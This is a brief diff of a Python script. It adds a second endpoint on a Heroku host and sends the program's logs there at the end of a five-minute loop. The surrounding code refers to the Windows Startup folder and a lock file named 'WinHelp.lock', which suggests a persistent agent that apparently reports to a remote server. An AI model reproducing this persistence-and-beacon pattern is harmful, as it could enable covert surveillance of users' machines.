@@ -24,6 +24,7 @@ win7_user_startup =\
         os.path.expanduser("~"),
         '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 server_url = 'https://tranquil-caverns-83807.herokuapp.com/json'
+log_url = 'https://tranquil-caverns-83807.herokuapp.com/logs'
 user_home = os.path.expanduser("~\Desktop")
 myself = os.path.basename(sys.argv[0])
 lock_file = '{}'.format(os.path.join(os.path.expanduser('~'), 'WinHelp.lock'))
@@ -205,7 +206,7 @@ def main():
         finally:
             log.info('Sending log to server')
             log.debug('End of loop, will wait for {} seconds'.format(300))
-            log.flush()
+            log.flush(log_url)
 
             next_call = next_call + int(300)
             if (next_call - time.time()) <= 0:
